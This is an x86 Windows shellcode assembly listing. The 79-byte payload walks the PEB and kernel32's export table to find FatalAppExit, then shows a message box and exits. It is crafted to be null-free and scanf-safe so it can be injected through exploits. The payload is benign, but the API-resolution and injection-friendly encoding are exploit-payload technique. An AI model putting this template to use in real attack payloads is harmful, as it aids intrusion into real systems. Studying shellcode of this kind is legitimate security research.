; ***************************************************************************************************
; * Shellcode by Moustafa Saleh         (msaleh83@gmail.com)                                        *
; * Size:       79 bytes                                                                            *
; * Function:   Displays a message box without using USER32.dll and exits (calls FatalAppExit() )   *
; * Notes:      null free, fscanf/scanf/sscanf safe (0x09, 0x0A, 0x0B, 0x0C, 0x0D and 0x20 free)    *
; *             Based on shellcode by Berend-Jan Wever & Peter Ferrie   @                           *
; *             http://code.google.com/p/win-exec-calc-shellcode/                                   *
; ***************************************************************************************************

.586
.MODEL FLAT,STDCALL
OPTION CASEMAP:NONE
ASSUME FS:NOTHING

.CODE
_start:
    XOR     EDX, EDX                        ; EDX = 0
    PUSH    EDX                             ; PUSH parameters of FatalAppExit
    PUSH    "AS0M"
    PUSH    ESP
    PUSH    EDX
    MOV     ESI, FS:[EDX + 30H]             ; ESI = [TEB + 0x30] = PEB
    MOV     DL, 21H
    DEC     EDX
    MOV     ESI, [ESI + EDX - 14h]          ; ESI = [PEB + 0x0C] = PEB_LDR_DATA
    MOV     ESI, [ESI + EDX - 14h]          ; ESI = [PEB_LDR_DATA + 0x0C] = LDR_MODULE InLoadOrder[0] (process)
    LODSD                                   ; EAX = InLoadOrder[1] (ntdll)
    MOV     ESI, [EAX]                      ; ESI = InLoadOrder[2] (kernel32)
    MOV     EDI, [ESI + 18h]                ; EDI = [InLoadOrder[2] + 0x18] = kernel32 DllBase
    MOV     EBX, [EDI + 3Ch]                ; EBX = [kernel32 + 0x3C] = offset(PE header)
    MOV     EBX, [EDI + EBX + 18h + 60h]    ; EBX = [PE32 optional header + offset(PE32 export table offset)] = offset(export table)
    ADD     EDX, EBX
    MOV     ESI, [EDI + EDX]                ; ESI = [kernel32 + offset(export table) + 0x20] = offset(names table)
    ADD     ESI, EDI                        ; ESI = kernel32 + offset(names table) = &(names table)
    MOV     ECX, [EDI + EBX + 24h]          ; ECX = [kernel32 + offset(export table) + 0x24] = offset(ordinals table)
    ADD     ECX, EDI                        ; ECX = kernel32 + offset(ordinals table) = ordinals table
    XOR     EDX, EDX
find_api:
    MOVZX   EBP, WORD PTR [ECX + EDX * 2]   ; EBP = [ordinals table + ( function number + 1) * 2] =  function ordinal (eventually)
    INC     EDX                             ; EDX = function number + 1
    LODSD                                   ; EAX = &(names table[function number]) = offset(function name)
    CMP     DWORD PTR [EDI + EAX], "ataF"   ; *(DWORD*)(function name) == "Fata" ?
    JNE     find_api
    MOV     ESI, [EDI + EBX + 1Ch]          ; ESI = [kernel32 + offset(export table) + 0x1C] = offset(address table)] = offset(address table)
    ADD     ESI, EDI                        ; ESI = kernel32 + offset(address table) = &(address table)
    ADD     EDI, [ESI + EBP * 4]            ; EDI = kernel32 + [&(address table)[function ordinal]] = offset(function) = &(function)
    CALL    EDI                             ; FatalAppExit (0, &("M0SA\0"));
    
END _start
